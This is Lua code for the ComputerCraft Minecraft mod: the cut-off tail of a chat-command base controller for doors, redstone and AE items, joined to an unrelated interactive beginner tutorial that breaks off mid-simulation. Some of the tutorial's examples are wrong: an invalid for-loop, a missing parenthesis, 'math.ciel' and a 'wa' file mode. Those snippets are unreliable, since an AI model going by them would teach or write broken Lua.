local ss = string.sub(command, 20, 50)
talk("say name of core")
event, player, corename = os.pullEvent("chat")
talk("say core id")
event, player, coreid = os.pullEvent("chat")
 
local coreid = tonumber(coreid)
rscores[corename] = coreid
savetable(rscores, rscorefile)
talk("redstone core: "..corename.." has been added")
end
-----end redstone core
-----begin door core
if s=="door" then
local ss = string.sub(command, 20, 50)
talk("say name of core")
event, player, corename = os.pullEvent("chat")
talk("say core id")
event, player, coreid = os.pullEvent("chat")
 
local coreid = tonumber(coreid)
dcores[corename] = coreid
savetable(dcores, dcorefile)
talk("door core: "..corename.." has been added")
end
-----end redstone core
end
 
 
 
 
 
 
 
 
 
 
if string.sub(command, 1, 20)=="add function" then
local s = string.sub(command, 22, 40)
addprog(s)
end
 
if string.sub(command, 1, 23)=="remove function" then
local s = string.sub(command, 25, 45)
if fs.exists(s) then
fs.delete(s)
talk("deleted function : "..s)
else
talk("file does not exist")
end
end
 

if string.sub(command, 1, 20)=="run function" then
local s = string.sub(command, 22, 40)
runprog(s)
end
 
 
 
if string.sub(command, 1, 11)=="say" then
local s = string.sub(command, 13, 30)
talk(s)
end
 

if command=="reboot" then
talk("rebooting...")
os.sleep(1)
os.reboot()
end
 

if string.sub(command, 1, 12)=="open" then
local s = string.sub(command, 14, 30)
------
for key,value in pairs( dcores ) do
   if key==s then
   rednet.send(value, "open")
   talk("opening: "..key)
   end
end
------
end
 

if string.sub(command, 1, 13)=="close" then
local s = string.sub(command, 15, 30)
------
for key,value in pairs( dcores ) do
   if key==s then
   rednet.send(value, "close")
   talk("closing: "..key)
   end
end
 
------
end
 

if string.sub(command, 1, 15)=="getitem" then
local s = string.sub(command, 17, 30)
b = tonumber(s)
rednet.send(aecore, b)
talk("attempting to retreive item from AE system, item ID is: "..s)
end
 

if string.sub(command, 1, 13)=="write" then
local s = string.sub(command, 15, 100)
rednet.send(moncore1, s)
talk("writing data to monitor")
end
 
 
 
 
 

if string.sub(command, 1, 15)=="turn on" then
local s = string.sub(command, 17, 100)
------
for key,value in pairs( rscores ) do
   if key==s then
   rednet.send(value, "on")
   talk("turning on: "..key)
   end
end
 
 
 
------
end
 
 
 
 
 
 

if string.sub(command, 1, 16)=="turn off" then
local s = string.sub(command, 18, 100)
 
------
for key,value in pairs( rscores ) do
   if key==s then
   rednet.send(value, "off")
   talk("turning off: "..key)
   end
end
------
end
-------------------[no commands beyond this]
end--ends commands
end -- end function
----------------------------------------------------------------------------------------
 
 
 
function main()
while true do
event, player, cmdinput = os.pullEvent("chat")
for i=1,#owners do
  if player==owners[i] then
  commands(cmdinput, player)
end
end
end
end
-------
 
 
 
 
 
 
 
 
--[main routine]
parallel.waitForAll(main, receive)
--[end main routine]
-- BaseLine Variables
CurrentChapter = 1
CurrentSection = 1
ChapterTitles = {
 "How to Create a Program",
 "How to Display and clear Text",
 "How to Use and Display Variables",
 "How to get User Input",
 "How to use IF statements",
 "How to use loops",
 "How to use redstone",
 "How to use redpower bundles",
 "How to use events",
 "How to use functions",
 "Extra Tips and Extra Functions"
}
Chapter = {
                     [1] = {
                                 "Key Points in this Chapter:\n1. Learning how to create a program.\n2. Learning how to save that program.\n3. Learning how to run that program.",
                 "1.1 - Learning how to create a program.\n\nOk so first things first right? We gotta learn how to create our first program. Creating a program is very simple in CC.\n\nedit programname\n\nedit means we want to create or edit program, and programname is the name of the program we wish to edit or create.",
                 "1.2 - Learning how to save that program.\n\nSo now your inside the editing feature of CC and you can move around almost like a notepad. We want to press the [Control] key which will bring up a menu at the bottom of your screen. Pressing the [Left] and [Right] arrow keys will change your selection in this menu. [SAVE] will save the program. [QUIT] will quit editing the program. By pressing [ENTER] we can choose our selection.",
                 "1.3 - Learning how to run that program.\n\nWe've created our little program, but how do we run it? Well thats simple. We type the program name into our terminal and press [ENTER], but remember all things in LUA are case-sensitive. Your program named \"Hello\" is not the same as your program named \"hello\".",
                 "1.4 - Practice What We've Learned!\n\nYou'll see a new option at the bottom of your screen now. You can press [SPACE] to continue onward to the next chapter, you can also press [ENTER] to run this chapters simulation.\nDon't worry, you won't hurt my feelings by not practicing.",
                 "SIM"                           
                                 },
                                 [2] = {
                                 "Key Points in this Chapter:\n1. How to use print\n2. How to use write\n3. How to clear the screen.\n4. How to use the cursor position.\n5. How to clear a specific line.",
                                 "2.1 - How to use print.\n\nTo show text to the user is a simple task. We do so by the following.\n\nprint (\"Hello User\")\n\nprint means to display the text to the user, and Hello User is the text we wish to display.",
                                 "2.2 - How to use write.\n\nWhen you print text, the program automatically adds a linebreak after your print command, sometimes you may not wish to do this.\n\nwrite (\"Hello\")\nprint (\"User\")\n\nThese two lines would make the exact same appearance as the print line we made previously. The reason is because the write command does not generate a linebreak and we can use this to keep our current position and continue writing on the same line.",
                                 "2.3 - How to clear the screen.\nQuite often you'll want to clear the screen automatically in your program.\n\nterm.clear()\n\nUsing this line we can clear the screen for our user to remove anything we don't want cluttering up the screen.",
                                 "2.4 - How to use the cursor position.\nThe cursor position is a very powerful thing. For example, when you clear the screen, the cursor still stays on it's previous line. Meaning that after you clear the screen, your next print statement very well may appear at the bottom of the screen.",
                                 "2.4 - How to use the cursor position.\nTo remedy this problem we've been given the command.\n\nterm.setCursorPos(1,1)\n\nThe first 1 in our statment is the horizontal position and the second 1 on our statement is the vertical posistion.",
                                 "2.4 - How to use the cursor position.\nBy using the term.setCursorPos(1,1) directly after a term.clear(), we can make sure that the next text we show the user appears at the top of his screen.\n\nRemember, lua is case sensitive. term.setcursorpos(1,1) is not right.",
                                 "2.5 - How to clear a specific line.\nBy using the term.setCursorPos we can create some pretty nifty tricks, like reprinting over lines already on the screen, or even clearing a certain line and printing something new.",
                                 "2.5 - How to clear a specific line.\nterm.setCursorPos(1,1)\nprint (\"You won't see this\")\nterm.setCursorPos(1,1)\nterm.clearLine()\nprint (\"Hello User\")\n\nWe used the term.clearLine() to remove the line at 1,1 and then we printed a new line where the old line used to be.",
                 "2.6 - Practice What We've Learned!\n\nYou'll see a new option at the bottom of your screen now. You can press [SPACE] to continue onward to the next chapter, you can also press [ENTER] to run this chapters simulation.\nDon't worry, you won't hurt my feelings by not practicing.",
                                 "SIM"
                                 },
                                 [3] = {
                                 "Key Points in this Chapter:\n1. What is a variable\n2. How to use a variable\n3. How to display a variable\n4. How to convert a variable",
                                 "3.1 - What is a variable.\n\nThink of a variable as a container in which you can place text or a number. Using variables allows you to store information and modify it on the fly. Using variables correctly is the key to making a sucessful program.",
                                 "3.2 - How to use a variable.\n\nThe first thing we should almost always do when we want to use a variable in a program is to define the variable. We do this by giving the variable a default piece of data. If we don't define a variable then the variable is considered NIL until it has been set.",
                                 "3.2 - How to use a variable.\n\nA NIL variable can cause lots of problems in your program, if you try to add together 2 variables and one is NIL, you'll get an error, if you try printing a NIL variable you'll get an error.",
                                 "3.2 - How to use a variable.\n\nWe'll be using the variable x from this point onward. Remember that x is different then X in lua.\n\nx = 0\n\nThis defined x to have a default value of 0. You could also do x = \"hello\" if you wanted it to contain text.",
                                 "3.2 - How to use a variable.\n\nA variable will hold it's data until you change it. Therefor x = 0 means that x will be 0 until you tell your program that x is something different.",
                                 "3.2 - How to use a variable.\n\nYou can also set variables as booleans, booleans are true and false.\nx = true\nThis would set x to true, which is different then \"true\". Using booleans gives you 1 more way to define a variable to be used later in your program.",
                                 "3.3 - How to display a variable.\n\nBeing able to show a variable to the user is very important. Who wants to just save the user's name in a variable, but not show it to them during the program? When displaying variables we can use the print or write commands.",
                                 "3.3 - How to display a variable.\nx = 0\nprint (x)\nx = \"Bob\"\nprint (\"Hello\"..x)\n\nYou'll notice in the last line that we used our x variable along with another piece of text. To do so we used .. which tells the program to add the x variable directly after the word Hello. In this syntax that would show the user   HelloBob  since we didn't add a space ;)",
                                 "3.3 - How to display a variable.\n\nRemember variables are case sensitive, and that variable1 is different then Variable1.\nIf you wanted to place a variable inbetween text you could do.\n\nprint (\"Hello \"..x..\" how are you?\")\n\nThis would print   Hello Bob how are you?",
                                 "3.4 - How to convert a variable.\n\nSometimes a variable might need to be converted, this is mainly the case when you want to use the variable as a number, but it's currently a string. For example:\nx = \"0\"\nx = x + 1\n\nThis will not work, as x equals \"0\"",
                                 "3.4 - How to convert a variable.\n\nThe difference between 0 and \"0\" is that one is a number and the other is a string. You can't use the basic math functions on strings. Lua can convert a number to a string automatically but it cannot convert a string to a number automatically.",
                                 "3.4 - How to convert a variable.\n\nx = 0\ny = \"1\"\nWe can't add those together atm, so we need to convert our string to a number so that we can add it to x.\ny = tonumber(y)\nThis converts y to a number (if it can't be converted to a number then y will be NIL)",
                                 "3.4 - How to convert a variable.\n\nNow that we've converted y to a number we can do.\nx = x + y\nThis would make x equal to x(0) + y(1). This means that x is now equal to 1 and y hasn't changed so it's still 1 as well.",
                                 "3.4 - How to convert a variable.\n\nIf we want to add a string to another string, we don't use the math symbols, we simply use ..\nx = \"Hello\"\ny = \"Bob\"\nx = x..y\nThis would make x = \"HelloBob\"",
                                 "3.4 - How to convert a variable.\n\nRemember that Lua can convert a number to a string, but not the other way around. If you always want to be 100% positive what your variables are, use the functions tonumber(x) and tostring(x).",
                 "3.5 - Practice What We've Learned!\n\nYou'll see a new option at the bottom of your screen now. You can press [SPACE] to continue onward to the next chapter, you can also press [ENTER] to run this chapters simulation.\nDon't worry, you won't hurt my feelings by not practicing.",
                                 "SIM"                           
                                 },
                                 [4] = {
                                 "Key Points in this Chapter:\n1. How to get user input",
                                 "4.1 - How to get user input.\n\nWhat's the point of having all these cool variables if your user can't make a variable be something they want? We fix this by allowing the user to input a variable into the program.",
                                 "4.1 - How to get user input.\n\nx = io.read()\nThe io.read() tells the program to stop and wait for user input, when the user presses enter that information is then stored in the variable x and the program continues.\nUser input is always stored as a string, therefor if the user types 1 and presses enter, x will be come \"1\", not 1",
                                 "4.1 - How to get user input.\n\nOnce the user's input is entered into the x variable you can use that variable like you would any other variable. This means if you then wanted to show the user their input you could follow your io.read() line with print(x)",
                                 "4.1 - How to get user input.\n\nBy using the write command before an io.read() we can show text then have the user type after that text.\nwrite(\"Enter Your Name -\"\nname = io.read()\nThis would have the user type their name directly after the - in the write statement.",
                 "4.2 - Practice What We've Learned!\n\nYou'll see a new option at the bottom of your screen now. You can press [SPACE] to continue onward to the next chapter, you can also press [ENTER] to run this chapters simulation.\nDon't worry, you won't hurt my feelings by not practicing.",
                                 "SIM"                           
                                 },
                                 [5] = {
                                 "Key Points in this Chapter:\n1. What is an IF statement\n2. The ELSE statement\n3. The ELSEIF statement\n4. Complex IF's",
                                 "5.1 - What is an IF statement.\n\nWe use IF statements to control the programs direction based on certain criteria that you define. Doing this allows us to do only certain things based on certain conditions.",
                                 "5.1 - What is an IF statement.\n\nif name == \"Bob\" then\nprint (\"Hello Again Bob\")\nend\n\nThe 1st line says, if the variable name is equal to \"Bob\" then enter this IF statement. The next line is the code that will run if name does equal Bob. The 3rd line says to end the IF statement, if the name was not Bob the program would skip to the line directly after end.",
                                 "5.1 - What is an IF statement.\n\nWe have many options in the IF statement, we could do:\nif x >= 1\nRemember we can't do that IF statement if x is a string x = \"1\".\nif name ~= \"Bob\"\nThe ~= option means is not equal too. This if statement would pass if the name was NOT Bob.",
                                 "5.2 - The ELSE statement.\n\nSometimes we want to do 1 thing if our IF statement is true and something else if it's false.\nif name == \"Bob\" then\nprint (\"Hello Bob\")\nelse\nprint(\"Your not Bob\")\nend\n\n",
                                 "5.2 - The ELSE statement.\n\nNotice how their is only 1 end statement as the last line of the entire IF statement. The ELSE line is a part of the current IF statement.",
                                 "5.3 - The ELSEIF statement.\n\nSometimes we want to check for multiple outcomes inside an IF statement, we can achieve this using the ELSEIF statement. The key things to remember is that you still only need 1 end as the last line, because this is 1 full statement, and that you will need to include a then for an ELSEIF.",
                                 "5.3 - The ELSEIF statement.\n\nif name == \"Bob\" then\nprint (\"Hello Bob\")\nelseif name == \"John\" then\nprint (\"Hello John\")\nelse\nprint (\"Hello Other\")\nend",
                                 "5.3 - The ELSEIF statement.\n\nI still included the final else, which tells the program if the name wasn't Bob or John, then do something else. Notice again that there was only a single end as the last line, because this was 1 full statement.",
                                 "5.4 - Complex IF's.\n\nIf's can become very complex depending on your situation. I will show some examples of more complex IF's:\nif name == \"Bob\" and name ~= \"John\" then\nWe are checking the variable twice in 1 if statement by using the AND statement. We could also use the OR statement",
                                 "5.4 - Complex IF's.\n\nYou can also place IF statements inside other IF statements, just make sure you place an END statement at the correct place for each IF statement. Next page is an example of a pretty complex IF statement.",
                                 "5.4 - Complex IF's.\nif name == \"Bob\" then\n     if x == 1 then\n     print(x)\n     else\n     print(\"Not 1\")\n     end\nprint (\"Hi Bob\")\nelse\nprint (\"Your not Bob\")\nend",
                                 "5.4 - Complex IF's.\nWith precise placement of IF statements you can control the flow of your program to a great degree, this allows you to make sure the user is only seeing what you want them to see at all times.",
                 "5.5 - Practice What We've Learned!\n\nYou'll see a new option at the bottom of your screen now. You can press [SPACE] to continue onward to the next chapter, you can also press [ENTER] to run this chapters simulation.\nDon't worry, you won't hurt my feelings by not practicing.",
                                 "SIM"                                                           
                                 },
                                 [6] = {
                                 "Key Points in this Chapter:\n1.What is a loop\n2.How to exit a loop\n3.Different kinds of loops",
                                 "6.1 - What is a loop\n\nA loop is a section of code that will continually run until told otherwise. We use these to repeat the same code until we say otherwise.\n\nwhile true do\nend\n\nThis is a while loop that has no exit, it will continually run over and over again until the program crashes.",
                                 "6.2 - How to exit a loop\nSince we don't want our loops to run until they crash we have to give them a way to stop. We do this by using the BREAK command.The break command is mostly placed inside an IF statement as just placing it in the loop itself would break the loop right away.",
                                 "6.2 - How to exit a loop\n\nx = 0\nwhile true do\n     x = x + 1\n     if x == 10 then\n     break\n     end\nend\n\nNotice how are while statements have their own end? This would run the loop and continually add 1 to x until x == 10 then it will break out of the loop.",
                                 "6.3 - Different kinds of loops\n\nYou don't always need to use the BREAK command. You can also include a condition in the WHILE statement for how long to run the loop.\n\nx = 0\nwhile x < 10 do\nx = x + 1\nend\n\nWe could also end this early with a BREAK as well.",
                                 "6.3 - Different kinds of loops\n\nHeck we don't even have to use the WHILE statement to create a loop.\n\nfor x = 0, 10, 1 do\nprint (x)\nend\n\nThe first line says - x starts at 0, and continues until 10, increasing by 1 every time we come back to this line.",
                                 "6.3 - Different kinds of loops\n\nSo using the for statement we could do.\n\nx = 5\nfor x, 50, 5 do\nprint (x)\nend\n\nThis would printout 5 then 10 then 15 ect ect until reaching 50.",
                 "6.4 - Practice What We've Learned!\n\nYou'll see a new option at the bottom of your screen now. You can press [SPACE] to continue onward to the next chapter, you can also press [ENTER] to run this chapters simulation.\nDon't worry, you won't hurt my feelings by not practicing.",
                                 "SIM"                                                           
                 },
                 [7] = {
                                 "Key Points in this Chapter:\n1. Turning on and off redstone\n2. Checking and Setting Redstone",
                                 "7.1 - Turning on and off redstone\n\nOne of the greatest features of CC is that your computer can not only receive redstone signals, but it can also send them as well. We have 6 directions to choose from and they are:\ntop, bottom, front, back, left, right",
                                 "7.1 - Turning on and off redstone\n\nWe can control redstone with our computer using 2 basic commands, redstone.getInput(side) and redstone.setOutput(side, boolean).\nWe have to remember to place our sides in quotes though IE \"left\"",
                                 "7.2 - Checking and Setting Redstone\n\nredstone.setOutput(\"back\", true)\nThis tells the computer to turn on the redstone output on the back of the computer. We can replace true with false to turn off the redstone output to the back.",
                                 "7.2 - Checking and Setting Redstone\n\nif redstone.getInput(\"back\") == true then\nprint \"Redstone is on\"\nend\n\nThis would enter the IF statement if their was power running to the back of the computer.",
                                 "7.2 - Checking and Setting Redstone\n\nBy checking and setting different redstone sources while using IF statements we can control multiple things connected to our computer based on the redstone connections.",
                                 "7.3 - Practice What We've Learned!\n\nYou'll see a new option at the bottom of your screen now. You can press [SPACE] to continue onward to the next chapter, you can also press [ENTER] to run this chapters simulation.\nDon't worry, you won't hurt my feelings by not practicing.",
                                 "SIM"                                                                           
                 },    
                 [8] = {
                                 "Key Points in this Chapter:\n1. How to turn on a single color\n2. How to turn off a single color\n3. Using multiple colors\n4. Testing Inputs\n5. Turning off all colors.",
                                 "8.1 - How to turn on a single color\n\nrs.setBundledOutput(\"back\", colors.white)\n\nThis would turn on the white output in the back.",
                                 "8.2 - How to turn off a single color\n\nrs.setBundledOutput(\"back\", rs.getBundledOutput(\"back\") - colors.white)\n\n This would turn off only the color white in the back.",
                                 "8.3 - Using Multiple colors\nUsing multiple colors is much easier when you use the colors.combine colors.subtract functions.",
                                 "8.3 - Using Multiple colors\n\nout = colors.combine(colors.blue, colors.white)\nrs.setBundledOutput(\"back\", out)\n\nThis would turn on blue and white at the back\nout = colors.subtract(out, colors.blue)\nrs.setBundledOutput(\"back\", out)\nThis would turn off blue, but leave white on.",
                                 "8.4 - Testing Inputs\n\nin = rs.getBundledInput(\"back\")\nif colors.test(in, colors.white) == true then\n\nThis would get the current input and store it in the in variable. We then use colors.test on the in variable to see if white is on.",
                                 "8.5 - Turning off all colors\n\nrs.setBundledOutput(\"back\", 0)\n\nSetting the output to 0 is the quickest and most efficient way to turn off all colors at the same time.",
                                 "8.6 - Practice What We've Learned!\n\nYou'll see a new option at the bottom of your screen now. You can press [SPACE] to continue onward to the next chapter, you can also press [ENTER] to run this chapters simulation.\nDon't worry, you won't hurt my feelings by not practicing.",
                                 "SIM"                                                                                                           
                                 },
                                 [9] = {
                                 "Key Points in this Chapter:\n1. What is an event?\n2. How do we check for events\n3. What types of events are there?\n4. Using event loops\n5. WHATS GOING ON!",
                                 "9.1 - What is an event?\n\nAn event can be many things, from redstone to timers, as well as smashing your face on the keyboard. These can all trigger events within a program, and by correctly using the os.pullEvent() command we can make sure that no matter what happens, we'll know about it!",
                                 "9.2 - How do we check for events\n\nevent, param1, param2 = os.pullEvent()\n\nPlacing this line in your code will stop the program until ANY event triggers. So just by pressing a key, you will pass this statement because a keypress is an event",
                                 "9.2 - How do we check for events\n\nThe easiest way to check for an event happening is the IF statement.\n\nif event == \"char\" and param1 == \"q\" then\n This line would trigger if you pressed q on your keyboard.",
                                 "9.3 - What types of events are there\n\nchar - triggers on keypress\nkey - triggers on keypress\ntimer - triggers on a timer running out\nalarm - triggers on an alarm going off\nredstone - triggers on any change to redstone",
                                 "9.3 - What types of events are there\n\ndisk - triggers on disk insertion\ndisk_eject - triggers on disk ejection",
                                 "9.4 - Using event loops\n\nUsing the pullEvent() function inside a loop is a great way to determine when to break the loop. For instance:\n\nwhile true do\nevent, param1, param2 = os.pullEvent()\n     if event == \"char\" and param1 == \"q\" then\n     break\n     end\nend",
                                 "9.5 - WHATS GOING ON!\nThis is a cool test program to make, so that you can see exactly whats happening in events.\n\nwhile true do\nevent, param1, param2, param3 = os.pullEvent()\nprint (\"Event = \"..event)\nprint (param1)\nprint (param2)\nprint (param3)\nend\n\nDon't Forget to Hold control+t to exit the loop.",
                                 "9.6 - Practice What We've Learned!\n\nYou'll see a new option at the bottom of your screen now. You can press [SPACE] to continue onward to the next chapter, you can also press [ENTER] to run this chapters simulation.\nDon't worry, you won't hurt my feelings by not practicing.",
                                 "SIM"                                                                                                                                           
                                 },
                                 [10] = {
                                 "Key Points in this Chapter:\n1. What is a function?\n2. How to use a basic function\n3. How to get a return value from a function",
                                 "10.1 - What is a function\n\nThink of a function as a part of your code that can be ran from anywhere inside your code. Once your function is done running, it will take you back to where your code left off.",
                                 "10.2 - How to use a basic function\n\nfunction hello()\nprint (\"Hello\")\nend\n\n Here we created a function named hello, and inside that function we placed a print statement that says hello.",
                                 "10.2 - How to use a basic function\n\nNow that we have our function created, anytime and anywhere in our program, we can place\nhello()\nThis will jump to the function, run the functions code, then come back to where you called the function.",
                                 "10.3 - How to get a return value from a function\n\nMost of the time we want our functions to do repetitious tasks for us though, to do this we can create a more advanced function that will return a value based on what happens in the function.",
                                 "10.3 - How to get a return value from a function\n\nfunction add(num1, num2)\nresult = tonumber(num1) + tonumber(num2)\nreturn result\nend\n\nThis is our adding function, it takes 2 numbers that we supply and returns the result.",
                                 "10.3 - How to get a return value from a function\n\nTo call our adding function we use.\nx = add(5,5)\nThis makes the add function use the numbers 5 and 5, which it will then add together and return to us. We save that return data in x",
                                 "10.3 - How to get a return value from a function\n\nBy combining what we already know, we must assume that we can use variables instead of numbers in our function. Therefor making:\nx = add(x, y)\nA perfectly good way to add 2 variables together.",
                                 "10.4 - Practice What We've Learned!\n\nYou'll see a new option at the bottom of your screen now. You can press [SPACE] to continue onward to the next chapter, you can also press [ENTER] to run this chapters simulation.\nDon't worry, you won't hurt my feelings by not practicing.",
                                 "SIM"                                                                                                                                                                           
                                 },
                                 [11] = {
                                 "This is not a Chapter, this is just random blurbs of extra information about other features and functions.",
                                 "Blurb 0 (The Most Important) - Use NOTEPAD++ to edit your code, the in-game edit kinda sucks\n\nFind your code in saves/world/computer/#",
                                 "Blurb 1 - sleep(1) will pause your code for 1 second",
                                 "Blurb 2 - timername = os.startTimer(1) will cause a timer to go off in 1 second, use events to check for the name",
                                 "Blurb 3 - Making your code readable helps everyone\nwhile true do\nif x == 5 then\nend\nend\nCOULD BE\nwhile true do\n     if x == 5 then\n     end\nend",
                                 "Blurb 4 - Atleast 75% of the time, an error tells you exactly whats wrong with your program.\nSomething with NIL means your trying to use a NIL variable.",
                                 "Blurb 5 - Google Is your friend, just try \"lua strings tutorial\"",
                                 "Blurb 6 - Theres DOZENS of functions I didn't go over, you should read about them on the interwebs\nstring.len()\nstring.sub()\nstring.find()\nio.open()\nio.close()",
                                 "Blurb 7 - No one will help you if you don't work on the code yourself and provide them with it.",
                                 "Blurb 8 - When your ready for more advanced coding, start looking into the default programs as well as other user created content.",
                                 "Blurb 9 - Using matrice's is a good test to see if your grasping lua",
                                 "Blurb 10 - You don't have to use functions if you trully don't understand them, they can make your life easier, but they can also make your life much harder.",
                                 "Blurb 11 - Find help on IRC, but prepare to have code ready to be shown. http://webchat.esper.net/?channels=#computercraft",
                                 "Blurb 12 - You can do almost anything your imagination can think up.....except magic",
                                 "Blurb 13 - By holding Control+t you can terminate any program. By holding Control+r you can reboot any computer.",
                                 "END"
                                 }
}
--"Event Checker""String Functions","File Functions","Math Functions","Calling Another Program","Disk Functions",
Examples = {
[1] = {
"Event Checker",
"This example is a great way to check what event is being passed through the pullEvent() statement. It uses a while loop that continually checks the pull event until the q key is pressed.",
[[
term.clear()
term.setCursorPos(1,1)
while true do
event, param1, param2 = os.pullEvent()
print (event)
print (param1)
print (param2)
if event == "char" and param1 == "q" then break end
end
]],
"eventchecker" -- filename to be saved as
},
[2] = {
"String Functions",
"This example uses some basic string functions to modify a string, we will take a long string and shorten it to 10 characters which will all be lowercased.",
[[
text = "Hello user and Welcome to the World of ComputerCraft"
 
blah = string.sub(text, 1, 10)
 
-- This line says that blah is now equal to 1-10 of text.
 
blah = string.lower(blah)
 
-- This line says that blah is now equal to an all lowercase blah.
 
print (blah)
-- This outputs as  hello user
]],
"stringfunc"
},
[3] = {
"File Functions",
"This example will check to see if the file exists we will open it in \"r\" mode to read, it will then read line by line from the file and store that data into an array, we will then print each line of the file with a 1 second sleep between them. We can use the file:write(variable) statement if the file is opened in write mode \"w\". We can append a file with the \"wa\" mode.",
[[
filename = "tutorial"
if fs.exists(filename) == true then
file = io.open(filename, "r")
local i = 1
local line = {}
while true do
line[i] = file:read()
if line[i] == nil then break end
print (line[i])
sleep (1)
i = i + 1
end
else
print ("File doesn't exist.")
end
]],
"filefunc"
},
[4] = {
"Math Functions",
"This tutorial will go over some of the math functions, we'll start with a random number from 1-10, we will then divide that by another random number from 1-20. We will take the result and round upwards to a whole number. Meaning that if our answer is 3.1 it will still round up to 4. You'll notice the math.ciel function which does our rounding, we could also use math.floor which would round down instead.",
[[
num1 = math.random(1,10)
num2 = math.random(1,20)
print ("Number 1 is "..num1)
print ("Number 2 is "..num2)
result = num1 / num2
print ("UnRounded Result is "..result)
result = math.ceil(result)
print ("Rounded Result is "..result)
]],
"mathfunc"
},
[5] = {
"Calling Another Program",
"This tutorial is very basic, but is a very powerful function as well. The shell.run command allows us to run a command from within our program as if we were at the terminal.",
[[
shell.run("programname")
shell.run("mkdir", "testing")
This would create a testing directory
shell.run("copy", "disk/hello", "world")
This would copy the program hello from the disk directory
and place it as a program called world in your root
directory.
]],
"callprogram"
},
[6] = {
"Disk Functions",
"This tutorial will go over some of the basic floppy functions. We will check to see if a floppy is inserted using the pullEvent() loop, we will then make sure the floppy doesn't have a label, and if it's label is empty we will label it Blank and exit the program. We can learn more about the disk functions by typing help disk at the terminal.",
[[
while true do
event, param1 = os.pullEvent()
if event == "disk" then
        if disk.getLabel(param1) == nil then
        disk.setLabel(param1, "Blank")
        print ("Disk labeled to Blank")
        print ("Disk is in the "..param1.." side")
        break
        else
        print ("Disk already has a label.")
        print ("Disk is in the "..param1.." side")
        break
        end
end
end
]],
"diskfunc"
}
}
 
function SaveExamples()
term.clear()
term.setCursorPos(1,1)
print "This will save all of the example programs into the examples folder."
print ""
print "You can access this folder by typing"
print "cd examples"
print "You can list the examples by typing"
print "ls"
print "You can simply edit the file to look"
print "at it, or you can open the file inside"
print "your computer by finding it in your"
print "saves directory under your worldname"
print "and computer #."
print ""
print ("Your Computer # is "..os.getComputerID())
pressany()
sleep(.5)
shell.run("mkdir", "examples")
local i = 1
        while true do
                if Examples[i] ~= nil then
                file = io.open("examples/"..Examples[i][4], "w")
                file:write("--[[\n")
                file:write(Examples[i][2])
                file:write("--]]\n")
                file:write(Examples[i][3])
                file:close()
                i = i + 1
                else
                break
                end
        end
term.clear()
term.setCursorPos(1,1)
print "Examples correctly saved to /examples"
pressany()
end
 
function mainmenu()
while true do
term.clear()
term.setCursorPos(1,1)
print "--------------------------------------"
print "| ComputerCraft Interactive Tutorial |"
print "|            By: Casper7526          |"
print "--------------------------------------"
print "|                                    |"
print "| 1. Start                           |"
print "| 2. Choose Chapter                  |"
print "| 3. Examples                        |"
print "| 4. Save Examples To File           |"
print "| 5. Exit                            |"
print "|                                    |"
print "--------------------------------------"
event, param1, param2, param3 = os.pullEvent()
if event == "char" and param1 == "5" then break end
if event == "char" and param1 == "1" then chapter = 1 LoadChapter(chapter) end
if event == "char" and param1 == "2" then ChooseChapter() end
if event == "char" and param1 == "3" then ChooseExample() end
if event == "char" and param1 == "4" then SaveExamples() end
end
end
 
function LoadExample(num)
term.clear()
term.setCursorPos(1,1)
print (Examples[num][2])
pressany()
term.clear()
sleep(.5)
term.setCursorPos(1,1)
print (Examples[num][3])
pressany()
end
 
function ChooseExample()
while true do
term.clear()
term.setCursorPos(1,1)
print "--------------- Example Index ---------------"
print "---------------------------------------------"
print ""
local i = 1
        while true do
        if Examples[i] == nil then break end
        print (i..". "..Examples[i][1])
        i = i + 1
        end
print ""
print "q. Quit"
print "---------------------------------------------"
write "Choice - "
choice = io.read()
if string.lower(choice) == "q" then break end
if Examples[tonumber(choice)] == nil then print "Thats not a valid chapter." sleep(1) else
LoadExample(tonumber(choice)) break end
end
end
 
 
 
function ChooseChapter()
while true do
term.clear()
term.setCursorPos(1,1)
print "--------------- Chapter Index ---------------"
print "---------------------------------------------"
print ""
local i = 1
        while true do
        if ChapterTitles[i] == nil then break end
        print (i..". "..ChapterTitles[i])
        i = i + 1
        end
print ""
print "q. Quit"
print "---------------------------------------------"
write "Choice - "
choice = io.read()
if string.lower(choice) == "q" then break end
if ChapterTitles[tonumber(choice)] == nil then print "Thats not a valid chapter." sleep(1) else
LoadChapter(tonumber(choice)) break end
end
end
 
function LoadChapter(chapter)
while true do
term.clear()
term.setCursorPos(1,1)
print ("Chapter "..chapter.." - "..ChapterTitles[chapter])
print ("---------------------------------------------")
print (Chapter[chapter][CurrentSection])
print ""
if Chapter[chapter][CurrentSection + 1] == "END" then print "THATS ALL FOLKS!" else
print "Press [Space] To Continue"
end
print "[q] - Main Menu [b] - Previous Page."
if Chapter[chapter][CurrentSection + 1] == "SIM" then print "Press [Enter] To Run Simulation" end
event, param1, param2, param3 = os.pullEvent()
    if event == "key" and param1 == 28 and Chapter[chapter][CurrentSection + 1] == "SIM" then Sim(chapter) EndSim(chapter) chapter = chapter + 1 CurrentSection = 1 end
        if event == "char" and param1 == "q" then CurrentSection = 1 break end
        if event == "char" and param1 == "b" then
        CurrentSection = CurrentSection - 1
        if CurrentSection == 0 then CurrentSection = 1 end
        end
        if event == "char" and param1 == " " and Chapter[chapter][CurrentSection + 1] ~= "END" then
        if Chapter[chapter][CurrentSection + 1] == "SIM" then chapter = chapter + 1 CurrentSection = 1 else CurrentSection = CurrentSection + 1 end
        end
end
end
 
function EndSim(chapter)
while true do
term.clear()
term.setCursorPos(1,1)
print "Great work back there!"
print ""
print "Press [ENTER] to move on to the next chapter"
event, param1, param2 = os.pullEvent()
if event == "key" and param1 == 28 then shell.run("rm", "tmptut") break end
end
end
 
function pressany()
term.setCursorPos(1,17)
print "Press Any Key To Continue"
event = os.pullEvent()
end
 
function Sim(chapter)
stage = 1
while true do
term.clear()
term.setCursorPos(1,1)
        if chapter == 1 then
    print "Your Goals:"
    print ""
    print "* Create a program named hello."
    print "* Type anything you wish inside that program."
        print "* Save and Exit the program."
        print "* Run the program."
        print ""
        print "quit   will exit the sim early."
        write (">") input = io.read()
        if input == "quit" then break end
            --------------------------------
                if stage == 1 then
                        if input == "edit hello" then
                        shell.run("edit", "tmptut")
                        print "Great Job, now let's run our program!"
                        sleep(2)
                        stage = 2
                        else
                        print "Remember, lua is case sensitive."
            print "Try"
            print "edit hello"
            sleep(2)                   
                        end
                elseif stage == 2 then
                    if input == "hello" then break
                        else
                        print "Remember, lua is case sensitive."
            print "Try"
            print "hello"
            sleep(2)                   
                        end
                end
        end
 
    if chapter == 2 then
        print "Your Goals:"
    print ""
    print "* Create a program named hello."
        print "* Clear the Screen"
